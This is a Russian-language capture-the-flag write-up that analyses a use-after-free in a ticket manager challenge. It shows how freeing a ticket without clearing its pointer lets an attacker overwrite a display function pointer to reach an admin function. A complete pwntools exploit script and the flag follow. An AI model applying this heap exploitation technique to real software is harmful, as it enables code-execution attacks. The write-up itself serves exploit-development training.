# Task: Призрак заявки

### Подробный анализ уязвимости

1. **Создание заявки**: При создании заявки вызывается функция ticket_create, которая выделяет память для структуры ticket, содержащей:
    - Указатель на функцию display, использующуюся для отображения содержимого заявки.
    - Заголовок и контент заявки.
    Пользователь указывает размер для контента, и malloc выделяет соответствующий объем памяти для его хранения.
2. **Удаление заявки**: Функция del_ticket освобождает память, занятую контентом заявки, но не обнуляет указатель на саму структуру ticket в ticket_list. Это приводит к состоянию UAF, поскольку, несмотря на освобождение памяти, указатель все еще можно использовать.
3. **Использование освобожденной памяти**: Поскольку указатель на структуру не удален, злоумышленник может создать новый объект в памяти, которая ранее использовалась для удаленного тикета. Так можно перезаписать поля старой заявки, включая указатель display, и перенаправить его на функцию admin.

### Цель эксплуатации

Задача состоит в том, чтобы создать заявки и удалить их, после чего создать новую заявку так, чтобы её данные записались в память освобожденной структуры. Это позволяет перезаписать указатель display, который затем вызовется через функцию read_ticket для выполнения функции admin.

### Эксплуатация

1. Создание двух заявок: Мы создаем две заявки с контентом фиксированного размера (например, 80 байт), чтобы они занимали определенные области памяти.
2. Удаление заявок: Удаляем обе заявки, освобождая тем самым память.
3. Создание третьей заявки: Создаем третью заявку с размером контента, равным размеру структуры ticket. Это действие приводит к выделению освобожденной памяти от предыдущих заявок и перезаписи данных в структуре удаленного тикета.
4. Перезапись указателя display: Перезаписываем указатель display на адрес функции admin, чтобы при вызове функции отображения вместо обычного вывода выполнялась привилегированная функция admin.

```python
from pwn import *

elf = context.binary = ELF("./chall")

# Подключаемся к серверу
p = remote("localhost", 12345)

# Адрес функции `admin`, куда будет перенаправлен указатель `display`
target = p64(0x401870)  # адрес функции `admin`


def login():
    p.recvline()
    p.sendline(b'a')
    p.recv(timeout=1)
    p.sendline(b'a')
    p.recv(timeout=1)

def choice(c):
    p.sendline()
    a = p.recvuntil(b"Exit")
    p.sendline(c)

def create(title, size, content):
    choice(b'3')
    p.sendline(title)
    p.sendline(size)
    p.sendline(content)


def delete(index):
    choice(b'4')
    p.sendline(index)


login()

create(b'title', b'80', b'test') 
create(b'title', b'80', b'test')
delete(b'0')
delete(b'0')
create(b'exploit', b'50', target)
choice(b'2')

p.sendline(b'2')
p.interactive()
p.close()
```

Flag: `EclipseCTF{h3ap_0v3rfl0w_m4st3ry_7x9Q2}`